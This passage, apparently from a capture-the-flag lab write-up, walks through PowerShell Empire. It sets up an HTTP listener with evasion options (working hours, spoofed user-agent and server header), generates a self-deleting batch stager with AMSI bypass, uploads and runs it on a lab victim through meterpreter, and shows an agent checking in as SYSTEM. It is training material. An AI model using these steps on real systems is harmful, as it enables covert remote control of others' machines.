aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="3"><li>What command can we now type to view all of the options related to our selected listener type?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners/http) &gt; help</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Listener Commands</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agents            Jump to the agents menu.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">back              Go back a menu.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">creds             Display/return credentials from the database.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">execute           Execute the given listener module.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit              Exit Empire.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">help              Displays the help menu.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info              Display listener module options.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">launcher          Generate an initial launcher for this listener.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">listeners         Jump to the listeners menu.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">main              Go back to the main menu.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">resource          Read and execute a list of Empire commands from a file.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">set               Set a listener option.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">unset             Unset a listener option.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners/http) &gt; info</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Name: HTTP[S]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Category: client_server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Authors:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  @harmj0y</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Description:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Starts a http[s] listener (PowerShell or Python) that uses a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  GET/POST approach.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HTTP[S] Options:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Name              Required    Value                            Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ----              --------    -------                          -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Name              True        http                             Name for the listener.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Host              True        http://192.168.178.52            Hostname/IP for staging.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  BindIP            True        0.0.0.0                          The IP to bind to on the control server.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Port              True                                         Port for the listener.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  StagingKey        True        (_2&gt;^3n|1C94SaB&amp;,!i;MPq5/[XAgUsv Staging key for initial agent negotiation.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  DefaultLostLimit  True        60                               Number of missed checkins before exiting</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                process.php|Mozilla/5.0 (Windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                NT 6.1; WOW64; Trident/7.0;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                rv:11.0) like Gecko</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  CertPath          False                                        Certificate path for https listeners.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Headers           True        Server:Microsoft-IIS/7.5         Headers for the control server.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Cookie            False       jlJBeiGTEBCfbuZ                  Custom Cookie Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Proxy             False       default                          Proxy to use for request (default, none, or other).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  SlackURL          False                                        Your Slack Incoming Webhook URL to communicate with your Slack instance.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners/http) &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>info</code></p><ol start="4"><li>Once the information regarding the listener pops up, peruse this for some of the more interesting options we can set in order to disguise our actions more. Which option can we use to set specific times when our listener will be active?</li></ol><blockquote><p><code>WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).</code></p></blockquote><p><code>WorkingHours</code></p><ol start="5"><li>Similar to changing/spoofing what browser you are using on the internet, what option can we set to appear as a different user agent (i.e. chrome, firefox, etc)?</li></ol><p>DefaultProfile    True /admin/get.php,/news.php,/login/ process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko    Default communication profile for the agent.</p><p><code>DefaultProfile</code></p><ol><li>What option can we use to set the port which the listener will bind to?</li></ol><blockquote><p><code>Port              True                                         Port for the listener.</code></p></blockquote><p><code>Port</code></p><ol start="2"><li>In addition to changing our browser profile, we can change what our server appears as. What option can we set to change this? </li></ol><blockquote><p>Depending on the context of the help menu you have up, this option might not show up (this is a rare case though). To provide further context to this question,
the server version can effective change your listener to appear as Microsoft IIS or possibly Apache. It&#x27;s all about obfuscation in this context. </p></blockquote><p><code>ServerVersion</code></p><ol start="3"><li>Launch our newly created listener on port 80 with the command &#x27;execute&#x27;. What message is displayed following successfully launching the listener?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners/http) &gt; set Port 4444</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners/http) &gt; execute</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Starting listener &#x27;http&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> * Serving Flask app &quot;http&quot; (lazy loading)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> * Environment: production</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   WARNING: This is a development server. Do not use it in a production deployment.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Use a production WSGI server instead.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> * Debug mode: off</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Listener successfully started!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners/http) &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>Listener successfully started!</code></p><ol start="4"><li>We can verify that our listener is now active by typing what command?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners/http) &gt; listeners</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Active listeners:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Name              Module          Host                                 Delay/Jitter   KillDate</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ----              ------          ----                                 ------------   --------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  http              http            http://192.168.178.52:4444           5/0.0                      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="stagers">Stagers<a href="#stagers" class="hash-link" aria-label="Direct link to Stagers" title="Direct link to Stagers">​</a></h2><p>Stagers metaphorically and literally set the stage for post-exploitation by retrieving the remaining code and associated information necessary to spawn a full-fledged agent.</p><ol><li>First, type the command &#x27;usestager&#x27; and double-tap tab to view all options we have for stagers. Which option allows us to use a batch file?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners) &gt; usestager </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">multi/bash                osx/applescript           osx/launcher              osx/shellcode             windows/dll               windows/launcher_sct      windows/shellcode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">multi/launcher            osx/application           osx/macho                 osx/teensy                windows/ducky             windows/launcher_vbs      windows/teensy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">multi/macro               osx/ducky                 osx/macro                 windows/backdoorLnkMacro  windows/hta               windows/launcher_xml      windows/wmic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">multi/pyinstaller         osx/dylib                 osx/pkg                   windows/bunny             windows/launcher_bat      windows/macro             </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">multi/war                 osx/jar                   osx/safari_launcher       windows/csharp_exe        windows/launcher_lnk      windows/macroless_msword</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>windows/launcher_bat</code></p><ol start="2"><li>Let&#x27;s finish our previous command and select the batch file option. Press enter to finalize this. What is our new path to the &#x27;module&#x27; we have selected?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners) &gt; usestager windows/launcher_bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: stager/windows/launcher_bat) &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>stager/windows/launcher_bat</code></p><ol start="3"><li>Since we&#x27;ve previously set our listener to use http, we must now set the associated options within our stager we are building to match that. What option must we set in order to accomplish this?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: stager/windows/launcher_bat) &gt; info</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name: BAT Launcher</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Description:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Generates a self-deleting .bat launcher for</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Empire.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Options:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Name             Required    Value             Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ----             --------    -------           -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Listener         True                          Listener to generate stager for.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Language         True        powershell        Language of the stager to generate.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  StagerRetries    False       0                 Times for the stager to retry</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 connecting.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 otherwise displayed on the screen.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Delete           False       True              Switch. Delete .bat after running.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Obfuscate        False       False             Switch. Obfuscate the launcher</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 powershell code, uses the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 ObfuscateCommand for obfuscation types.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 For powershell only.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 Only used if Obfuscate switch is True.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 For powershell only.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  UserAgent        False       default           User-agent string to use for the staging</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 request (default, none, or other).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Proxy            False       default           Proxy to use for request (default, none,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 or other).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ProxyCreds       False       default           Proxy credentials</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 ([domain\]username:password) to use for</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 request (default, none, or other).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  AMSIBypass       False       True              Include mattifestation&#x27;s AMSI Bypass in</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 the stager code.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  AMSIBypass2      False       False             Include Tal Liberman&#x27;s AMSI Bypass in</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                                                 the stager code.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><p><code>Listener         True                          Listener to generate stager for.</code></p></blockquote><p><code>Listener</code></p><ol start="4"><li>Type execute to finish creating our stager. Where is the stager saved?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: stager/windows/launcher_bat) &gt; set Listener http1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: stager/windows/launcher_bat) &gt; execute</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Stager output written out to: /tmp/launcher.bat</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>/tmp/launcher.bat</code></p><ol start="5"><li>Using any shell you have previously gained into our victim system transport the stager batch file to the system and execute it. This can be done in numerous ways depending on the stager used, be prepared to be flexible with your transportation methods similarly to how you might handle an msfvenom package. </li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter &gt; upload /tmp/launcher.bat launcher.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] uploading  : /tmp/launcher.bat -&gt; launcher.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Uploaded 5.13 KiB of 5.13 KiB (100.0%): /tmp/launcher.bat -&gt; launcher.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] uploaded   : /tmp/launcher.bat -&gt; launcher.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter &gt; shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Process 1924 created.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Channel 5 created.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Microsoft Windows [Version 6.1.7601]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Windows\system32&gt;launcher.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">launcher.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Windows\system32&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: stager/windows/launcher_bat) &gt; </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Sending POWERSHELL stager (stage 1) to 10.10.80.135</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] New agent FKRDZB8C checked in</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Initial agent FKRDZB8C from 10.10.80.135 now active (Slack)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Sending agent (stage 2) to FKRDZB8C at 10.10.80.135</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: stager/windows/launcher_bat) &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="agents-and-post-exploitation">Agents and Post-Exploitation<a href="#agents-and-post-exploitation" class="hash-link" aria-label="Direct link to Agents and Post-Exploitation" title="Direct link to Agents and Post-Exploitation">​</a></h2><p>Interact with our ses.. er agents and do neat things.</p><ol><li>First, type agents to view our registered agents.</li></ol><p><code>No answer needed</code></p><ol start="2"><li>Once you&#x27;ve typed agents to list the registered agents, the agents submenu will become active. Use the help menu to answer the following questions.</li></ol><p><code>No answer needed</code></p><ol start="3"><li>What command do we use to interact with an agent?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: stager/windows/launcher_bat) &gt; agents</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Active agents:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> FKRDZB8C ps 10.10.80.135    JON-PC            *WORKGROUP\SYSTEM       powershell         2492   5/0.0    2020-10-03 23:26:43  http1           </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: agents) &gt; interact FKRDZB8C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 